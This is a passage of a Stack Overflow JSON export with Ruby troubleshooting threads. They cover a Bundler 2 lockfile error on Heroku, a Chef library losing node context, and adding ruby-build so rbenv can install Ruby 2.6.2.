Sims", "link": "https://stackoverflow.com/users/10239403/demian-sims"}, "reply_to_user": {"reputation": 3902, "user_id": 10608621, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d59df09a85d05117c63706f66811b70c?s=128&d=identicon&r=PG", "display_name": "mechnicov", "link": "https://stackoverflow.com/users/10608621/mechnicov"}, "edited": false, "score": 0, "creation_date": 1558472481, "post_id": 56227085, "comment_id": 99111040, "body": "my <code>Gemfile.lock</code> always contains ` bundler (&gt;= 1.3.0)` but at the bottom it says <code>bundled with 2.0.1</code>"}, {"owner": {"reputation": 3902, "user_id": 10608621, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d59df09a85d05117c63706f66811b70c?s=128&d=identicon&r=PG", "display_name": "mechnicov", "link": "https://stackoverflow.com/users/10608621/mechnicov"}, "edited": false, "score": 0, "creation_date": 1558472932, "post_id": 56227085, "comment_id": 99111217, "body": "Did you try simply <code>bundle exec heroku rails db:migrate</code>?"}, {"owner": {"reputation": 597, "user_id": 10239403, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/44fbdaea0dedd13b281fb7e70665efe4?s=128&d=identicon&r=PG", "display_name": "Demian Sims", "link": "https://stackoverflow.com/users/10239403/demian-sims"}, "reply_to_user": {"reputation": 3902, "user_id": 10608621, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d59df09a85d05117c63706f66811b70c?s=128&d=identicon&r=PG", "display_name": "mechnicov", "link": "https://stackoverflow.com/users/10608621/mechnicov"}, "edited": false, "score": 0, "creation_date": 1558477259, "post_id": 56227085, "comment_id": 99112474, "body": "Just tried that. Still getting <code>You must use Bundler 2 or greater with this lockfile.</code>"}], "answers": [{"tags": [], "owner": {"reputation": 166, "user_id": 10718641, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2ee2ea1a39fae737a8f030e26bc322c2?s=128&d=identicon&r=PG&f=1", "display_name": "Abe", "link": "https://stackoverflow.com/users/10718641/abe"}, "is_accepted": false, "score": 0, "last_activity_date": 1558381276, "creation_date": 1558381276, "answer_id": 56227183, "question_id": 56227085, "link": "https://stackoverflow.com/questions/56227085/getting-error-you-must-use-bundler-2-or-greater-with-this-lockfile-after-tryi/56227183#56227183", "title": "Getting error &#39;You must use Bundler 2 or greater with this lockfile.` after trying many solutions", "body": "<p>This is a suggestion (not a solution) but I don't have to karma to comment, so forgive me.  Three things to try:</p>\n\n<p><code>bundle install &amp;&amp; bundle update</code></p>\n\n<p><code>bundle exec [COMMAND]</code>, i.e. <code>bundle exec heroku rake db:migrate</code></p>\n\n<p>Also, go through your <code>gemfile</code> and run\n<code>gem pristine [GEMNAME]</code> on each one.</p>\n\n<p>I've been there.  Good luck and please update if you do solve it!</p>\n"}, {"comments": [{"owner": {"reputation": 597, "user_id": 10239403, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/44fbdaea0dedd13b281fb7e70665efe4?s=128&d=identicon&r=PG", "display_name": "Demian Sims", "link": "https://stackoverflow.com/users/10239403/demian-sims"}, "edited": false, "score": 0, "creation_date": 1558449262, "post_id": 56228897, "comment_id": 99100010, "body": "Ok so this brings up another problem. When I try to start deleting all the versions of bundler which are clearly listed after running <code>gem list | grep &quot;bundle&quot;</code>, it tells bundler is not installed."}, {"owner": {"reputation": 597, "user_id": 10239403, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/44fbdaea0dedd13b281fb7e70665efe4?s=128&d=identicon&r=PG", "display_name": "Demian Sims", "link": "https://stackoverflow.com/users/10239403/demian-sims"}, "edited": false, "score": 0, "creation_date": 1558472540, "post_id": 56228897, "comment_id": 99111053, "body": "I would love some help on this. It won&#39;t let me uninstall the other versions. Only 2.0.1. I&#39;m going in circles here and it&#39;s taken me a week to get a Rails app up to Heroku. Should it really be this hard?? When I try to uninstall the other versions of bundler that are listed there, it&#39;s says bundler not installed!!"}, {"owner": {"reputation": 21, "user_id": 10699985, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f17253539b8b20400c5c80d5077b882a?s=128&d=identicon&r=PG&f=1", "display_name": "Tariq Mamdouh Ahmed", "link": "https://stackoverflow.com/users/10699985/tariq-mamdouh-ahmed"}, "reply_to_user": {"reputation": 597, "user_id": 10239403, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/44fbdaea0dedd13b281fb7e70665efe4?s=128&d=identicon&r=PG", "display_name": "Demian Sims", "link": "https://stackoverflow.com/users/10239403/demian-sims"}, "edited": false, "score": 0, "creation_date": 1558480441, "post_id": 56228897, "comment_id": 99113133, "body": "the problem is that rails freezes specific bundler versions, you can solve this by running:-  <code>gem install bundler -v 1.17.1</code> then <code>bundle _1.17.1_ install</code> and don&#39;t forget to delete <code>Gemfile.lock</code> before you run the second command, and no I believe this is heroku issue not yours"}, {"owner": {"reputation": 597, "user_id": 10239403, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/44fbdaea0dedd13b281fb7e70665efe4?s=128&d=identicon&r=PG", "display_name": "Demian Sims", "link": "https://stackoverflow.com/users/10239403/demian-sims"}, "edited": false, "score": 0, "creation_date": 1558490607, "post_id": 56228897, "comment_id": 99114818, "body": "Thanks for your help but sitll getting the same error. I tried what you suggested. Another thing that keeps happening is that I have to keep <code>rvm use --default 2.6.1</code> for Ruby. It keeps slipping back to <code>2.6.0</code>. Maybe that&#39;s another issue. Isn&#39;t there an issue with the system Ruby vs a local install? Again, maybe another issue. Also wondering if there are alternatives to Heroku for React/Rails."}, {"owner": {"reputation": 597, "user_id": 10239403, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/44fbdaea0dedd13b281fb7e70665efe4?s=128&d=identicon&r=PG", "display_name": "Demian Sims", "link": "https://stackoverflow.com/users/10239403/demian-sims"}, "edited": false, "score": 0, "creation_date": 1558534566, "post_id": 56228897, "comment_id": 99134431, "body": "I&#39;m wondering if there&#39;s a way to reinstall anything having to do with Ruby/Rails and if this would help? I&#39;m using Ruby 2.6.1 and Bundler 2.0 which is what Heroku is asking for and yet an earlier version of Bundler is showing up in my Gemlock file and still installed on my machine which won&#39;t let me uninstall."}, {"owner": {"reputation": 492, "user_id": 8773858, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-neWH_DwCy6U/AAAAAAAAAAI/AAAAAAAABWs/EJIBPUBRFr0/photo.jpg?sz=128", "display_name": "Quintessa Anderson", "link": "https://stackoverflow.com/users/8773858/quintessa-anderson"}, "edited": false, "score": 0, "creation_date": 1563206269, "post_id": 56228897, "comment_id": 100614492, "body": "This worked for me!! It took nearly half a day to find the answer, thank you!!"}, {"owner": {"reputation": 492, "user_id": 8773858, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-neWH_DwCy6U/AAAAAAAAAAI/AAAAAAAABWs/EJIBPUBRFr0/photo.jpg?sz=128", "display_name": "Quintessa Anderson", "link": "https://stackoverflow.com/users/8773858/quintessa-anderson"}, "edited": false, "score": 0, "creation_date": 1563206349, "post_id": 56228897, "comment_id": 100614524, "body": "Even though this works, I&#39;m curious, how come we can&#39;t have the installed bundler version as 2 or greater and the Gemfile.lock Bundled with 2 or greater?"}], "tags": [], "owner": {"reputation": 21, "user_id": 10699985, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f17253539b8b20400c5c80d5077b882a?s=128&d=identicon&r=PG&f=1", "display_name": "Tariq Mamdouh Ahmed", "link": "https://stackoverflow.com/users/10699985/tariq-mamdouh-ahmed"}, "is_accepted": false, "score": 1, "last_activity_date": 1558390990, "creation_date": 1558390990, "answer_id": 56228897, "question_id": 56227085, "link": "https://stackoverflow.com/questions/56227085/getting-error-you-must-use-bundler-2-or-greater-with-this-lockfile-after-tryi/56228897#56228897", "title": "Getting error &#39;You must use Bundler 2 or greater with this lockfile.` after trying many solutions", "body": "<p>The Problem that your installed bundler version is 2 or greater and Gemfile.lock is <code>BUNDLED WITH</code> 2 or greater, </p>\n\n<p>I've ran into this many time, downgrading your bundler to 1.17.1 will do the trick for you :-</p>\n\n<ol>\n<li>get your all bundler versions by running <code>gem list | grep \"bundle\"</code></li>\n<li>start removing them all by typing <code>gem uninstall bundler -v &lt;version_here&gt;</code></li>\n<li>Now you have no bundler gems installed, install the desired one by running <code>gem install bundler -v 1.17.1</code></li>\n<li>Delete <code>Gemfile.lock</code> file from your project</li>\n<li>Navigate to your project directory and run <code>bundle install</code></li>\n<li>Check that your <code>Gemfile.lock</code> is <code>BUNDLED WITH</code> 1.17.1, usually your found this line at the end of file</li>\n<li>you are ready to go, deploy your application and it will run</li>\n</ol>\n\n<p>Hope this works with you.</p>\n"}], "owner": {"reputation": 597, "user_id": 10239403, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/44fbdaea0dedd13b281fb7e70665efe4?s=128&d=identicon&r=PG", "display_name": "Demian Sims", "link": "https://stackoverflow.com/users/10239403/demian-sims"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1635, "favorite_count": 0, "answer_count": 2, "score": 1, "last_activity_date": 1558390990, "creation_date": 1558380853, "question_id": 56227085, "link": "https://stackoverflow.com/questions/56227085/getting-error-you-must-use-bundler-2-or-greater-with-this-lockfile-after-tryi", "title": "Getting error &#39;You must use Bundler 2 or greater with this lockfile.` after trying many solutions", "body": "<p>I'm having a problem that I've seen others have and have tried many solutions offered but nothing works. When trying to deploy a rails app to Heroku and get to the point where I have to <code>heroku rake db:migrate</code>, I get the error <code>You must use Bundler 2 or greater with this lockfile.</code></p>\n\n<p>I was initially running Ruby 2.6.0 but upgraded to 2.6.1 after reading some posts that this had been fixed. Running Rails 5.2.2.</p>\n\n<p>I have tried to:</p>\n\n<ul>\n<li>delete lockfile and bundle install</li>\n<li>gem update bundler (to 2.0) </li>\n<li>bundle install --system </li>\n<li>heroku buildpacks:set </li>\n<li>gem install bundler - </li>\n<li>tried deleting my Rails app on Heroku and reset the Heroku repo and started over</li>\n<li>tried <code>heroku rake:detach rake db:migrate</code> or something like that. This allowed for the migration but then I got errors and the dyno crashed. </li>\n<li>tried creating a Procfile.dev with the commands <code>web: bundle exec bin/rails server -p $PORT -e $RAILS_ENV\nworker: bundle exec sidekiq -C config/sidekiq.yml</code></li>\n</ul>\n\n<p>Here are some bits of code that could perhaps shed some light on my situation. </p>\n\n<p>my Gemfile:</p>\n\n<pre><code>source 'https://rubygems.org'\ngit_source(:github) { |repo| \"https://github.com/#{repo}.git\" }\n\nruby '2.6.1'\n\n# Bundle edge Rails instead: gem 'rails', github: 'rails/rails'\ngem 'rails', '~&gt; 5.2.2'\n# Use postgresql as the database for Active Record\ngem 'pg', '&gt;= 0.18', '&lt; 2.0'\n# Use Puma as the app server\ngem 'puma', '~&gt; 3.11'\ngem 'active_model_serializers'\ngem 'httparty'\n# Build JSON APIs with ease. Read more: https://github.com/rails/jbuilder\n# gem 'jbuilder', '~&gt; 2.5'\n# Use Redis adapter to run Action Cable in production\n# gem 'redis', '~&gt; 4.0'\n# Use ActiveModel has_secure_password\ngem 'bcrypt', '~&gt; 3.1.7'\ngem 'jwt-auth', '~&gt; 3.0'\n# gem 'dotenv-rails', groups: [:development, :test]\ngem \"figaro\"\n\n\ngem \"aws-sdk-s3\", require: false\n\n# Use ActiveStorage variant\n# gem 'mini_magick', '~&gt; 4.8'\n\n# Use Capistrano for deployment\n# gem 'capistrano-rails', group: :development\n\n# Reduces boot times through caching; required in config/boot.rb\ngem 'bootsnap', '&gt;= 1.1.0', require: false\n\n# Use Rack CORS for handling Cross-Origin Resource Sharing (CORS), making cross-origin AJAX possible\ngem 'rack-cors'\ngem 'rename'\n\n\ngroup :development, :test do\n  # Call 'byebug' anywhere in the code to stop execution and get a debugger console\n  gem 'byebug', platforms: [:mri, :mingw, :x64_mingw]\nend\n\ngroup :development do\n  gem 'listen', '&gt;= 3.0.5', '&lt; 3.2'\n\n\nend\n\n\n# Windows does not include zoneinfo files, so bundle the tzinfo-data gem\ngem 'tzinfo-data', platforms: [:mingw, :mswin, :x64_mingw, :jruby]\n</code></pre>\n\n<p>my logfile when I attempt to <code>heroku open</code>:</p>\n\n<pre><code>2019-05-20T19:18:37.154031+00:00 app[api]: Release v2 created by user demiansims@gmail.com\n2019-05-20T19:18:37.154031+00:00 app[api]: Enable Logplex by user demiansims@gmail.com\n2019-05-20T19:18:36.926353+00:00 app[api]: Release v1 created by user demiansims@gmail.com\n2019-05-20T19:18:36.926353+00:00 app[api]: Initial release by user demiansims@gmail.com\n2019-05-20T19:19:02.000000+00:00 app[api]: Build started by user demiansims@gmail.com\n2019-05-20T19:19:52.512189+00:00 app[api]: Set LANG, RACK_ENV, RAILS_ENV, RAILS_LOG_TO_STDOUT, RAILS_SERVE_STATIC_FILES, SECRET_KEY_BASE config vars by user demiansims@gmail.com\n2019-05-20T19:19:52.512189+00:00 app[api]: Release v3 created by user demiansims@gmail.com\n2019-05-20T19:19:53.944345+00:00 app[api]: Deploy 3ab64d18 by user demiansims@gmail.com\n2019-05-20T19:19:53.944345+00:00 app[api]: Release v6 created by user demiansims@gmail.com\n2019-05-20T19:19:53.957391+00:00 app[api]: Scaled to console@0:Free rake@0:Free web@1:Free by user demiansims@gmail.com\n2019-05-20T19:19:53.639739+00:00 app[api]: Attach DATABASE (@ref:postgresql-defined-55908) by user demiansims@gmail.com\n2019-05-20T19:19:53.656114+00:00 app[api]: @ref:postgresql-defined-55908 completed provisioning, setting DATABASE_URL. by user demiansims@gmail.com\n2019-05-20T19:19:53.639739+00:00 app[api]: Running release v4 commands by user demiansims@gmail.com\n2019-05-20T19:19:53.656114+00:00 app[api]: Release v5 created by user demiansims@gmail.com\n2019-05-20T19:19:57.332749+00:00 heroku[web.1]: Starting process with command `bin/rails server -p 46673 -e production`\n2019-05-20T19:19:56.000000+00:00 app[api]: Build succeeded\n2019-05-20T19:19:59.100443+00:00 heroku[web.1]: State changed from starting to crashed\n2019-05-20T19:19:59.107493+00:00 heroku[web.1]: State changed from crashed to starting\n2019-05-20T19:19:59.038377+00:00 app[web.1]: /app/vendor/ruby-2.6.0/lib/ruby/2.6.0/bundler/lockfile_parser.rb:108:in `warn_for_outdated_bundler_version': You must use Bundler 2 or greater with this lockfile. (Bundler::LockfileError)\n2019-05-20T19:19:59.038393+00:00 app[web.1]: from /app/vendor/ruby-2.6.0/lib/ruby/2.6.0/bundler/lockfile_parser.rb:95:in `initialize'\n2019-05-20T19:19:59.038394+00:00 app[web.1]: from /app/vendor/ruby-2.6.0/lib/ruby/2.6.0/bundler/definition.rb:83:in `new'\n2019-05-20T19:19:59.038395+00:00 app[web.1]: from /app/vendor/ruby-2.6.0/lib/ruby/2.6.0/bundler/definition.rb:83:in `initialize'\n2019-05-20T19:19:59.038397+00:00 app[web.1]: from /app/vendor/ruby-2.6.0/lib/ruby/2.6.0/bundler/dsl.rb:234:in `new'\n2019-05-20T19:19:59.038398+00:00 app[web.1]: from /app/vendor/ruby-2.6.0/lib/ruby/2.6.0/bundler/dsl.rb:234:in `to_definition'\n2019-05-20T19:19:59.038399+00:00 app[web.1]: from /app/vendor/ruby-2.6.0/lib/ruby/2.6.0/bundler/dsl.rb:13:in `evaluate'\n2019-05-20T19:19:59.038402+00:00 app[web.1]: from /app/vendor/ruby-2.6.0/lib/ruby/2.6.0/bundler/definition.rb:34:in `build'\n2019-05-20T19:19:59.038404+00:00 app[web.1]: from /app/vendor/ruby-2.6.0/lib/ruby/2.6.0/bundler.rb:135:in `definition'\n2019-05-20T19:19:59.038405+00:00 app[web.1]: from /app/vendor/ruby-2.6.0/lib/ruby/2.6.0/bundler.rb:101:in `setup'\n2019-05-20T19:19:59.038406+00:00 app[web.1]: from /app/vendor/ruby-2.6.0/lib/ruby/2.6.0/bundler/setup.rb:20:in `&lt;top (required)&gt;'\n2019-05-20T19:19:59.038408+00:00 app[web.1]: from /app/vendor/ruby-2.6.0/lib/ruby/2.6.0/rubygems/core_ext/kernel_require.rb:54:in `require'\n2019-05-20T19:19:59.038409+00:00 app[web.1]: from /app/vendor/ruby-2.6.0/lib/ruby/2.6.0/rubygems/core_ext/kernel_require.rb:54:in `require'\n2019-05-20T19:19:59.038410+00:00 app[web.1]: from /app/config/boot.rb:3:in `&lt;top (required)&gt;'\n2019-05-20T19:19:59.038411+00:00 app[web.1]: from bin/rails:3:in `require_relative'\n2019-05-20T19:19:59.038413+00:00 app[web.1]: from bin/rails:3:in `&lt;main&gt;'\n2019-05-20T19:19:59.079452+00:00 heroku[web.1]: Process exited with status 1\n2019-05-20T19:20:02.333495+00:00 heroku[web.1]: Starting process with command `bin/rails server -p 48713 -e production`\n2019-05-20T19:20:05.071247+00:00 heroku[web.1]: State changed from starting to crashed\n2019-05-20T19:20:05.054251+00:00 heroku[web.1]: Process exited with status 1\n2019-05-20T19:20:04.972527+00:00 app[web.1]: /app/vendor/ruby-2.6.0/lib/ruby/2.6.0/bundler/lockfile_parser.rb:108:in `warn_for_outdated_bundler_version': You must use Bundler 2 or greater with this lockfile. (Bundler::LockfileError)\n2019-05-20T19:20:04.972545+00:00 app[web.1]: from /app/vendor/ruby-2.6.0/lib/ruby/2.6.0/bundler/lockfile_parser.rb:95:in `initialize'\n2019-05-20T19:20:04.972547+00:00 app[web.1]: from /app/vendor/ruby-2.6.0/lib/ruby/2.6.0/bundler/definition.rb:83:in `new'\n2019-05-20T19:20:04.972548+00:00 app[web.1]: from /app/vendor/ruby-2.6.0/lib/ruby/2.6.0/bundler/definition.rb:83:in `initialize'\n2019-05-20T19:20:04.972550+00:00 app[web.1]: from /app/vendor/ruby-2.6.0/lib/ruby/2.6.0/bundler/dsl.rb:234:in `new'\n2019-05-20T19:20:04.972555+00:00 app[web.1]: from /app/vendor/ruby-2.6.0/lib/ruby/2.6.0/bundler/dsl.rb:234:in `to_definition'\n2019-05-20T19:20:04.972557+00:00 app[web.1]: from /app/vendor/ruby-2.6.0/lib/ruby/2.6.0/bundler/dsl.rb:13:in `evaluate'\n2019-05-20T19:20:04.972559+00:00 app[web.1]: from /app/vendor/ruby-2.6.0/lib/ruby/2.6.0/bundler/definition.rb:34:in `build'\n2019-05-20T19:20:04.972560+00:00 app[web.1]: from /app/vendor/ruby-2.6.0/lib/ruby/2.6.0/bundler.rb:135:in `definition'\n2019-05-20T19:20:04.972562+00:00 app[web.1]: from /app/vendor/ruby-2.6.0/lib/ruby/2.6.0/bundler.rb:101:in `setup'\n2019-05-20T19:20:04.972563+00:00 app[web.1]: from /app/vendor/ruby-2.6.0/lib/ruby/2.6.0/bundler/setup.rb:20:in `&lt;top (required)&gt;'\n2019-05-20T19:20:04.972565+00:00 app[web.1]: from /app/vendor/ruby-2.6.0/lib/ruby/2.6.0/rubygems/core_ext/kernel_require.rb:54:in `require'\n2019-05-20T19:20:04.972566+00:00 app[web.1]: from /app/vendor/ruby-2.6.0/lib/ruby/2.6.0/rubygems/core_ext/kernel_require.rb:54:in `require'\n2019-05-20T19:20:04.972568+00:00 app[web.1]: from /app/config/boot.rb:3:in `&lt;top (required)&gt;'\n2019-05-20T19:20:04.972570+00:00 app[web.1]: from bin/rails:3:in `require_relative'\n2019-05-20T19:20:04.972571+00:00 app[web.1]: from bin/rails:3:in `&lt;main&gt;'\n2019-05-20T19:20:10.571751+00:00 app[api]: Starting process with command `bundle exec rake db:migrate` by user demiansims@gmail.com\n2019-05-20T19:20:13.762466+00:00 heroku[run.5828]: State changed from starting to up\n2019-05-20T19:20:13.765155+00:00 heroku[run.5828]: Awaiting client\n2019-05-20T19:20:13.799505+00:00 heroku[run.5828]: Starting process with command `bundle exec rake db:migrate`\n2019-05-20T19:20:18.499328+00:00 heroku[run.5828]: State changed from up to complete\n2019-05-20T19:20:18.474268+00:00 heroku[run.5828]: Process exited with status 20\n2019-05-20T19:22:57.021525+00:00 app[api]: Starting process with command `bundle exec rake db:migrate` by user demiansims@gmail.com\n2019-05-20T19:23:00.672287+00:00 heroku[run.2331]: State changed from starting to up\n2019-05-20T19:23:00.689268+00:00 heroku[run.2331]: Awaiting client\n2019-05-20T19:23:00.740482+00:00 heroku[run.2331]: Starting process with command `bundle exec rake db:migrate`\n2019-05-20T19:23:05.400934+00:00 heroku[run.2331]: State changed from up to complete\n2019-05-20T19:23:05.385380+00:00 heroku[run.2331]: Process exited with status 20\n2019-05-20T19:24:17.980956+00:00 app[api]: Starting process with command `bundle exec rake db:migrate` by user demiansims@gmail.com\n2019-05-20T19:24:20.590557+00:00 heroku[run.2935]: Awaiting client\n2019-05-20T19:24:20.812085+00:00 heroku[run.2935]: State changed from starting to up\n2019-05-20T19:24:20.609194+00:00 heroku[run.2935]: Starting process with command `bundle exec rake db:migrate`\n2019-05-20T19:24:25.018756+00:00 heroku[run.2935]: State changed from up to complete\n2019-05-20T19:24:24.994002+00:00 heroku[run.2935]: Process exited with status 20\n2019-05-20T19:32:18.494661+00:00 heroku[router]: at=error code=H10 desc=\"App crashed\" method=GET path=\"/\" host=faunagram-api.herokuapp.com request_id=53b89a56-41ac-46b6-b8e7-328c912db131 fwd=\"184.152.71.64\" dyno= connect= service= status=503 bytes= protocol=https\n2019-05-20T19:32:19.118662+00:00 heroku[router]: at=error code=H10 desc=\"App crashed\" method=GET path=\"/favicon.ico\" host=faunagram-api.herokuapp.com request_id=ca60c3fa-0092-48d1-807d-30f1f77b9745 fwd=\"184.152.71.64\" dyno= connect= service= status=503 bytes= protocol=https\n\n</code></pre>\n\n<p>Hopefully this enough information. This has been kind of a nightmare.</p>\n"}, {"tags": ["ruby", "chef-infra"], "answers": [{"tags": [], "owner": {"reputation": 1519, "user_id": 1247302, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/a776f298b4f508a2ae2ddf0d8ca9f9bc?s=128&d=identicon&r=PG", "display_name": "mrswadge", "link": "https://stackoverflow.com/users/1247302/mrswadge"}, "is_accepted": true, "score": 0, "last_activity_date": 1558439898, "creation_date": 1558439898, "answer_id": 56237813, "question_id": 56225139, "link": "https://stackoverflow.com/questions/56225139/chefnode-available-in-library-called-from-recipe-but-not-when-called-through/56237813#56237813", "title": "Chef::Node available in library called from recipe, but not when called through Singleton Class", "body": "<p>I changed my approach to create a <a href=\"https://docs.chef.io/custom_resources.html\" rel=\"nofollow noreferrer\">custom resource</a>.</p>\n\n<pre><code>resource_name :otbo_service\nactions [:stop, :start, :restart, :nothing]\ndefault_action :nothing\n\nproperty :service, Hash, required: true\n\naction_class do\n  def control(commands)\n    handle(new_resource.service, commands)\n  end\nend\n\ndef handle(service, commands)\n  name = service[:name]\n\n  for command in commands\n    service[command].call()\n  end\nend\n\naction :nothing do\n  Chef::Log.info('Nothing to do.')\nend\n\naction :stop do\n  control([:stop])\nend\n\naction :start do\n  control([:start])\nend\n\naction :restart do\n  control([:stop, :start])\nend\n</code></pre>\n\n<p>I added a library function that can access the node variable.</p>\n\n<pre><code>module Common\n  module Util\n    def _WLStart() \n      Chef::Log.info(\"&lt;&lt; Starting WebLogic Server on Host: #{node['hostname']} &gt;&gt;\")\n    end\n\n    def _WLShutdown() \n      Chef::Log.info(\"&lt;&lt; Stopping WebLogic Server on Host: #{node['hostname']} &gt;&gt;\")\n    end\n  end\nend\n\nChef::Recipe.send(:include, Common::Util)\nChef::Resource.send(:include, Common::Util)\n\n</code></pre>\n\n<p>In the recipe I can then call the custom resource via code something like the following.</p>\n\n<pre><code>extend Common::Util\n\nweblogic = {\n  :name =&gt; 'weblogic',\n  :start =&gt; lambda { _WLStart() },\n  :stop =&gt; lambda { _WLShutdown() }\n}\n\notbo_service 'Restart WebLogic' do\n  action :restart\n  service weblogic\nend\n</code></pre>\n"}], "owner": {"reputation": 1519, "user_id": 1247302, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/a776f298b4f508a2ae2ddf0d8ca9f9bc?s=128&d=identicon&r=PG", "display_name": "mrswadge", "link": "https://stackoverflow.com/users/1247302/mrswadge"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 223, "favorite_count": 0, "accepted_answer_id": 56237813, "answer_count": 1, "score": 2, "last_activity_date": 1558439898, "creation_date": 1558370926, "last_edit_date": 1558372025, "question_id": 56225139, "link": "https://stackoverflow.com/questions/56225139/chefnode-available-in-library-called-from-recipe-but-not-when-called-through", "title": "Chef::Node available in library called from recipe, but not when called through Singleton Class", "body": "<p>I've written a service hub that allows me to stop and start services, a very simplified version of the structure is below without service dependencies added.</p>\n\n<pre><code>class Otbo\n  class Services (requires Singleton)\n    SERVICE_WEBLOGIC = {\n      :start =&gt; lambda { Otbo::Services.instance._WLStart() },\n      :stop =&gt; lambda { Otbo::Services.instance._WLStop() }\n    }\n    module Controller\n      def control(service, command)\n         service[command].call()\n      end\n    end\n    include Otbo::Services::Controller\n    include Singleton\n   end\nend\n\nChef::Recipe.send(:include, Otbo::Services::Controller)\nChef::Resource.send(:include, Otbo::Services::Controller)\n</code></pre>\n\n<p>In another cookbook library to avoid circular dependency, I have added the include via the send method - which ties up the below <code>_WLStart()</code> and <code>_WLStop()</code> methods in the lambdas in the code above here.</p>\n\n<pre><code>module OtboDomain\n  module Util\n    def _WLStart()\n      if has_role?(node, 'weblogic_adminserver') or has_role?(node, 'otbo_weblogic')\n        puts 'Starting WebLogic...'\n      end\n    end\n    def _WLStop()\n      if has_role?(node, 'weblogic_adminserver') or has_role?(node, 'otbo_weblogic')\n        puts 'Stopping WebLogic...'\n      end\n    end\n  end\nend\n\nOtbo::Services.send(:include, OtboDomain::Util)\n</code></pre>\n\n<p>When accessing <code>_WLStop()</code> or <code>_WLStart()</code> directly from a recipe via an <code>extend OtboDomain::Util</code> I am able to access the <code>node</code> attribute happily. All good.</p>\n\n<p>When I call through via <code>Otbo::Service.control(service, command)</code> method I lose node context and it is not available in <code>_WLStart()</code> or <code>_WLStop()</code>, so I get an error. </p>\n\n<pre><code>node01 ================================================================================\nnode01 Recipe Compile Error in c:/chef/cache/cookbooks/otbo_weblogic/recipes/default.rb\nnode01 ================================================================================\nnode01\nnode01 NameError\nnode01 ---------\nnode01 undefined local variable or method `node' for #&lt;Otbo::Services:0x000000000819d018&gt;\nnode01\nnode01 Cookbook Trace:\nnode01 ---------------\nnode01   c:/chef/cache/cookbooks/otbo_domain/libraries/util.rb:200:in `_WLStop'\nnode01   c:/chef/cache/cookbooks/otbo_services/libraries/control.rb:36:in `block in &lt;class:Services&gt;'\nnode01   c:/chef/cache/cookbooks/otbo_services/libraries/control.rb:74:in `block in control'\nnode01   c:/chef/cache/cookbooks/otbo_services/libraries/control.rb:69:in `each'\nnode01   c:/chef/cache/cookbooks/otbo_services/libraries/control.rb:69:in `control'\nnode01   c:/chef/cache/cookbooks/otbo_weblogic/recipes/setup.rb:114:in `from_file'\nnode01   c:/chef/cache/cookbooks/otbo_weblogic/recipes/default.rb:12:in `from_file'\n</code></pre>\n\n<p>Is it possible to make the <code>node</code> attribute available when calling via <code>Otbo::Service.control(service, command)</code> ?</p>\n"}, {"tags": ["ruby", "rbenv", "ruby-build"], "answers": [{"comments": [{"owner": {"reputation": 1148, "user_id": 6591347, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/muykQ.png?s=128&g=1", "display_name": "Oleksii Filonenko", "link": "https://stackoverflow.com/users/6591347/oleksii-filonenko"}, "edited": false, "score": 0, "creation_date": 1558377009, "post_id": 56224842, "comment_id": 99073222, "body": "And after you do the initial setup of <code>ruby-build</code>, you can update it by running <code>git pull origin master</code> from the <code>~&#47;.rbenv&#47;plugins&#47;ruby-build</code> directory anytime you want to get newer versions."}], "tags": [], "owner": {"reputation": 84135, "user_id": 631619, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/b6f3159af5195eddff62a2dd4f9ad969?s=128&d=identicon&r=PG", "display_name": "Michael Durrant", "link": "https://stackoverflow.com/users/631619/michael-durrant"}, "is_accepted": false, "score": 3, "last_activity_date": 1558370186, "last_edit_date": 1558370186, "creation_date": 1558369677, "answer_id": 56224842, "question_id": 56224841, "link": "https://stackoverflow.com/questions/56224841/rbenv-doesnt-have-the-ruby-version-and-the-ruby-build-plugs-directory-doesnt-e/56224842#56224842", "title": "rbenv doesn&#39;t have the ruby version and the ruby-build plugs directory doesn&#39;t exist, what to do?", "body": "<p>Follow these steps:</p>\n\n<pre><code># confirm version NOT available\n$ rbenv install --list | grep 2.6.2\n# Nothing shows up\n\n$ git clone https://github.com/rbenv/ruby-build.git ~/.rbenv/plugins/ruby-build\n\n$ rbenv install --list | grep 2.6.2\n2.6.2 # &lt;-- Now it shows up !\n</code></pre>\n\n<p>Now that version can be installed locally</p>\n\n<pre><code>$ rbenv install 2.6.2\n$ ruby -v\n$ ruby 2.6.2p47\n</code></pre>\n\n<p>One final step I had to do was</p>\n\n<pre><code>$ bundle # -&gt; this gave an error \"You must use Bundler 2 or greater with this lockfile.\"\n$ gem install bundler:2.0.1\n</code></pre>\n\n<p>Finally, a</p>\n\n<pre><code>$ bundle\n</code></pre>\n\n<p>for a project with a <code>.ruby-version</code> file of <code>2.6.2</code> will work !</p>\n"}], "owner": {"reputation": 84135, "user_id": 631619, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/b6f3159af5195eddff62a2dd4f9ad969?s=128&d=identicon&r=PG", "display_name": "Michael Durrant", "link": "https://stackoverflow.com/users/631619/michael-durrant"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 397, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1558370186, "creation_date": 1558369677, "question_id": 56224841, "link": "https://stackoverflow.com/questions/56224841/rbenv-doesnt-have-the-ruby-version-and-the-ruby-build-plugs-directory-doesnt-e", "title": "rbenv doesn&#39;t have 